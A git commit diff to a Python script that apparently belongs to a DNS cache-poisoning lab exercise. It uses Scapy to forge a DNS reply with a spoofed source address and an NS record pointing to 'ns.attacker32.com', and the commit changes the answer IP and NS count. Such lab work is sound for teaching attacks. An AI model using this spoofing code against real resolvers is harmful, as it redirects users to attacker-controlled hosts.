1167dff6f732f26a3bb6029b16bf8a77b711171e
Zohar Simhon <Zoharsimhon13@gmail.com>
2023-05-31 15:08:07 +0300

    changed the request & response packets

--- volumes/generate dns reply.py
+++ volumes/generate dns reply.py
@@ -8,10 +8,10 @@ ns = 'ns.attacker32.com'
 
 # Construct the DNS header and payload
 Qdsec = DNSQR(qname=name)
-Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
+Anssec = DNSRR(rrname=name, type='A', rdata='1.1.2.2', ttl=259200)
 NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
 dns = DNS(id=0xAAAA, aa=1, rd=0, qr=1,
-          qdcount=1, ancount=1, nscount=0, arcount=0,
+          qdcount=1, ancount=1, nscount=1, arcount=0,
           qd=Qdsec, an=Anssec, ns=NSsec)
 # Construct the IP, UDP headers, and the entire packet
 ip = IP(dst='10.0.9.53', src='199.43.135.53', chksum=0)
